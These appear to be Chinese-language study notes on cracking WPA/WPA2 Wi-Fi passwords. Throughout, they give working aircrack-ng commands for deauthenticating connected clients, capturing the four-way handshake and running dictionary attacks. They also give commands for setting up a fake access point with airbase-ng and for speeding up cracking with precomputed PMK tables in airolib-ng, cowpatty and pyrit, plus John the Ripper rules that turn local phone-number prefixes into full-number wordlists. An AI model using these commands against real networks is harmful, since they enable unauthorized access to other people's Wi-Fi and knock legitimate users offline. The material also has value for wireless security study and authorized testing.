WPA PSK攻击

  • 只有一种密码破解方法
    • WPA不存在WEP的弱点

PSK破解过程

  • 启动monitor
  • 开始抓包并保存
  • Deauthentication攻击获取4步握手信息（抓不到包的话打断目前存在的连接）
  • 使用字典暴力破解

  • 启动monitor

  • 侦听周围目标

  • 抓取指定AP数据包

    –bssid：AP的MAC；-c：11AP信道；-w：wpa抓包结果保存为wpa；

此时没有抓到四步握手的数据包，只能打掉客户端连接进行抓取

  • aireplay-ng -0 10 -a 50:21:EC:42:E3:80 -c DC:31:D1:9B:61:C5 wlan0

    -0攻击包用于打掉客户端连接；-a：AP的MAC地址；-c：STA的MAC地址

  • 报错

出现报错，wlan0工作在11信道，而AP工作在6信道；使用 airodump-ng wlan0 --bssid 50:21:EC:42:E3:80 -c 6 -w wpa 命令切换到6信道侦听即可

此时已经发送了10个0号攻击包

  • 抓取到握手包

    图中红色方框部分就是抓取到握手包的标志

  • 暴力破解

    这些都是抓取到无线包，其中只有.cap后缀的包用于aircrack-ng暴力破解（由于前几次抓取握手包不成功，需要多抓几次，最后一次wpa-06.cap成功抓取握手包）

    • 使用aircrack-ng内置的字典进行暴力破解

      • 路径：/usr/share/john/password.lst
      • 其中想要破解的密码必须要在密码字典中，若不在密码字典中破解不出密码

    • aircrack-ng -w /usr/share/john/password.lst wpa-06.cap

      密码已经被爆破出来

总结：

破解无线wifi可以分为以下几步：

查看网卡名：iwconfig
设置监听模式：airmon-ng start wlan0
扫描附近WIFI：airodump-ng wlan0mon
选定目标监听其流量：airodump-ng -w tplink -c (channel） –bssid (BSSID) wlan0mon
选定连接的客户端进行攻击：aireplay-ng -0 50 -a (BSSID) -c (STATION) wlan0mon
对抓取到的cap包进行暴力破解：aircrack-ng -w (password.txt) -b (BSSID) (xxx.cap)

无AP情况下的WPA密码破解

  • 启动monitor
  • 开始抓包并保存
  • 根据 probe 信息伪造相同ESSID的AP
  • 抓取四步握手中的前两个包
  • 使用字典暴力破解

原理：

依据目标探测的AP，我们自己伪造一个ESSID为其名的AP，然后根据WPA认证机制（上图）我们就可以知道ESSID，ANonce，SNonce，MAC1，MAC2，为此我们只有PSK不知道，但是目标会将PMK（PSK+ESSID计算得来），ANonce，SNonce，MAC1，MAC2计算的MIC和SNonce发给伪造的AP，又因相关加密算法是已知的，所以我们可以暴力枚举可能的PSK值，然后计算MIC，与目标发过来的MIC所对比，当一致时则破解成功。

  • 启动wlan0的monitor模式

  • 伪造AP

    • 先使用sirdump-ng抓取客户端曾经连接过的AP

    • airbase-ng –essid zmr -c 6 -Z 4 wlan0

      -c指定信道，-Z代表WPA2加密，-z表示WPA1加密，不使用z / Z参数表示open状态；4是指定CCMP加密

    • 抓包破解

      • airodump-ng wlan0 –essid 淡墨天羽 -w wpa -c 6

    • 之后会抓到WPA前2步的握手包，再使用aircrack-ng进行暴力破解

      这里由于设备等因素实验做得并不完备，后续补充。WPA破解思路就是这样。

无线密码破解工具

AIROLIB 破解密码

由于PSK+ESSID计算PMK时要经过4096次的迭代计算，这使暴力破解的速度很慢，破解过程中CPU等资源消耗严重，为此我们可以事先将可能PMK计算出来，破解时再用PMK进行后续计算，这使得玻璃破解的速度会得到很大的提高，不过亦有缺点，当ESSID变动后当前的PMK又得重计算。

  • AIROLIB破解
    • 设计用于存储ESSID和密码列表
      • 计算生成不变的PMK（计算资源消耗型）
      • PMK在破解阶段被用于计算PTK（速度快，计算资源要求少）
      • 通过完整性摘要值破解密码
      • SQLlite3数据库存储数据

  • 将ESSID放入一个文本文件中

  • airolib-ng db –import essid essid.txt # 导入essid

    创建一个数据库db，同时导入essid存入essid.txt

  • 查看数据库状态

  • 导入密码文件

    • airolib-ng db –import passwd /usr/share/john/password.lst

其中有些小于8个字符的密码会被剔除掉，导入数据库时会被忽略掉

此时有653个密码被导入

  • airolib-ng db –batch

    生成PMK

此时已经就有了PMK的字典

  • 使用db中的PMK值进行破解

    • aircrack-ng -r db wpa-01.cap

    破解成功

JTR 破解密码

  • John the ripper

    • 快速的密码破解软件

    • 支持基于规则动态扩展密码字典（破解时动态扩展）

  • 很多人喜欢用手机号码做无线密码

    • 获取号段并利用JTR规则增加最后几位的数字

  • 配置文件 /etc/john/john.conf

    • [list.Rules:Wordlist] # 配置文件中存放密码规则的字段
    • $[0-9]$[0-9]$[0-9]$[0-9] # 添加的规则

  • 打开配置文件添加规则

    • vim /etc/john/john.conf

    • 在规则的末尾添加新规则$[0-9]$[0-9]$[0-9]$[0-9] 后保存

  • 找到某个地区前七位的手机号码号段写入一个文件中

  • 使用john生成新的完整手机号码

    • john --wordlist=phone_num.txt --rules --stdout

      –wordlist：使用的那一个密码字典；–rules：对密码字典使用密码规则；–stdout：将内容全部输出出来

  • 破解

    • john --wordlist=phone_num.txt --rules --stdout | aircrack-ng -e 淡墨天羽 -w - wpa-01.cap

      -w后面的-表示前面输出的手机号码内容（一般情况-w后面指定一个密码字典）

      密码最终破解不成功，JTR密码破解大概思路和操作如上

COWPATTY 破解密码

cowpatty 也是通过提前计算PMK来提升破解速度的

  • WPA密码通用破解工具
  • 使用密码字典
    • cowpatty -r wpa.cap -f password.lst -s
  • 使用彩虹表（PMK）
    • genpmk -f password.lst -d pmkhash -s #第三方工具生成PMK
    • cowpatty -r wpa.cap -d pmkhash -s 　　#使用PMK破解

  • 监听，抓包

  • 破解

    • cowpatty -r wpa-01.cap -f /usr/share/john/password.lst -s 淡墨天羽

      -f：指定密码文件的路径；-s：指定ESSID名称

使用PMK破解

  • 生成PMK

    • genpmk -f /usr/share/john/password.lst -d pmkhash -s 淡墨天羽

      -d：表示生成的PMK存放在pmkhash这个文件中

  • 破解

    • cowpatty -r wpa-01.cap -d pmkhash -s 淡墨天羽

      速度很快，毫秒速度破解出密码；cowpatty优势就在于先计算PMK后进行调用彩虹表破解速度提升

PYRIT 破解密码（推荐）

  • 与airolib、cowpatty相同，支持基于预计算的PMK提高破解速度

  • 独有的优势

    • 除CPU之外pyrit可以运行GPU的强大运算能力加速生成PMK
    • 本身支持抓包获取四步握手过程，无需用Airdump抓包
    • 也支持传统的读取airodump抓包获取四步握手的方式

  • 只抓取WAP四次握手过程包

    • pyrit -r wlan2mon -o wpapyrit.cap stripLive # -r 指定网卡，-o指定输出文件，striplive过滤出握手包
      pyrit -r wpapyrit.cap analyze　　# 对抓的握手包进行分析（AP的MAC，加密方式等）

  • 从airodump抓包导入并筛选

    • pyrit -r wpa.cap -o wpapyrit.cap strip # 将airodump抓的包过滤下

  • 使用密码字典直接破解

    • pyrit -r wpaprit.cap -i password.lst -b attack passthrough

  • 数据库模式破解

    • 默认使用基于文件的数据库，支持连接SQL数据库，将计算的PMK存入数据库
    • 查看默认数据库状态：pyrit eval
    • 导入密码字典：pyrit -i password.lst import_passwords (会自动剔除了不合规的密码）
    • 指定ESSID：pyrit -e zmr create_essid
    • 计算PMK：pyrit batch (发挥GPU计算能力）
    • 破解密码：pyrit -r wpapyrit.cap -b attack_db
